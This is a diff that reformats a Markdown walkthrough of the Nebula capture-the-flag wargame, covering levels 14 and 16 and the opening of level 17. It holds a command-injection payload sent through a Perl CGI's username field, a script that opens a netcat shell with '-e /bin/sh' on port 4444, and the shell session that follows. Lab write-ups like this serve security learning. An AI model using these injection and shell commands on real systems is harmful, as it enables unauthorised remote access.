@@ -284,8 +284,8 @@ for i in range(0, len(input)):
 print "".join(out)
 ```
 I've  'deciphered' the token:
-```
-$python dec.py `cat /home/flag14/token`
+```bash
+$ python dec.py `cat /home/flag14/token`
 8457c118-887c-4e40-a5a6-33a25353165
 ```
 
@@ -361,31 +361,21 @@ You have successfully executed getflag on a target account
 ```
 
 ## Level 16
-We have another vulnerable Perl script listening on port 1616. This script forms a command to be executed based on unsanitized user input - $username variable:
-?
-1
-2
-3
+We have another vulnerable Perl script listening on port 1616. This script forms a command to be executed based on unsanitized user input - the **_$username_** variable:
+```perl
 $username =~ tr/a-z/A-Z/; # conver to uppercase
 $username =~ s/\s.*//;  # strip everything after a space
 @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
-The $username variable is first converted to uppercase and everything after a blank space is trimmed. So we have to inject a command there taking into account these restrictions. The solution is taken from here, with small modifications.
-We create a script (with its name in uppercase) and place it in the /tmp folder, where the flag16 user (the owner of thttpd process) can access it. 
-?
-1
-2
+```
+
+The `$username` variable is first converted to uppercase and everything after a blank space is trimmed. So we have to inject a command there taking into account these restrictions. The solution is taken from [here](http://thisisdearmo.blogspot.com/2012/06/nebula-level-16-solution.html), with small modifications. We create a script (with its name in uppercase) and place it in the `/tmp` folder, where the flag16 user (the owner of thttpd process) can access it. 
+```bash
 $ ps aux |grep -i  httpd | grep flag16
 flag16 736  0.0 0.2 2460 712 ?  Ss   09:34   0:00 /usr/sbin/thttpd -C /home/flag16/thttpd.conf
+```
+
 To execute it, we use a feature of bash that searches file names containing replacement characters. An example clarifies this: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
+```bash
 level16@nebula:~$ mkdir -p dir1/dir2/dir3/dir4
 level16@nebula:~$ touch dir1/dir2/dir3/dir4/MYSCRIPT
 level16@nebula:~$ ls /*/*/*/*/*/*/MYSCRIPT
@@ -394,35 +384,29 @@ level16@nebula:~$ ls /*/*/*/dir?/*/*/MYSCRIPT
 /home/level16/dir1/dir2/dir3/dir4/MYSCRIPT
 level16@nebula:~$ ls /*/*/d?r1/*/*/*/MYSCRIPT
 /home/level16/dir1/dir2/dir3/dir4/MYSCRIPT
-So taking advantage of this neat feature we create the file MYSCRIPT in /tm folder, and execute it with /*/SCRIPT (all uppercase).  We need the traditional version of netcat, not the OpenBSD variant, to have access to execute (-e) feature. Putting all together, we have: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
+```
+
+So taking advantage of this neat feature we create the file `MYSCRIPT` in /tm folder, and execute it with **/\*/SCRIPT** (all uppercase).  We need the traditional version of netcat, not the OpenBSD variant, to have access to execute (**-e**) feature. Putting everything together, we have: 
+```bash
 level16@nebula:~$ vim /tmp/SCRIPT:
 #!/bin/sh
 nc.traditional -l -p 4444 -e /bin/sh
 level16@nebula:~$ chmod +x /tmp/SCRIPT
- 
-> nc nebula 1616
+```
+
+And to execute `getflag`:
+```bash
+~ nc nebula 1616
 GET /index.cgi?username="`/*/SCRIPT`"&password=pass
  
-> nc 192.168.0.18 4444
+~ nc 192.168.0.18 4444
 id
 uid=983(flag16) gid=983(flag16) groups=983(flag16)
 getflag
 You have successfully executed getflag on a target account
-Level 17
+```
+
+## Level 17
 Level 17 deals with an interesting yet dangerous feature of Python, the ability to pickle (and unpickle) binary objects. The following vulnerable line unpickles an object from an unsanitized input read through a socket:
 ?
 1
